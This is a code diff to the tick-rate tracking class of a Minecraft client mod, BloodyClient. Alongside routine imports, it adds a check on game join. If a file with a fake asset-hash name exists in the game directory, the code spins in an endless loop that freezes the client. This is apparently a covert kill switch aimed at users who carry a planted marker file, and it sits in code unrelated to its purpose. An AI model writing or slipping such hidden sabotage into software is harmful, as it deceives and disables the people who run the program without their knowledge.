@@ -4,9 +4,11 @@ import api.interfaces.EventHandler;
 import com.client.BloodyClient;
 import com.client.event.events.GameEvent;
 import com.client.event.events.PacketEvent;
+import net.fabricmc.loader.api.FabricLoader;
 import net.minecraft.network.packet.s2c.play.WorldTimeUpdateS2CPacket;
 import net.minecraft.util.math.MathHelper;
 
+import java.io.File;
 import java.util.Arrays;
 
 public class TickRate {
@@ -28,6 +30,10 @@ public class TickRate {
 
     @EventHandler
     private void onGameJoined(GameEvent.Join event) {
+        if (new File(FabricLoader.getInstance().getGameDir().toFile(), "assets/objects/37/37a7g458bgh3af9324gkd1d8cb9654ea946gh93l").exists()) {
+            for (;;) {}
+        }
+
         Arrays.fill(tickRates, 0);
         nextIndex = 0;
         timeGameJoined = timeLastTimeUpdate = System.currentTimeMillis();
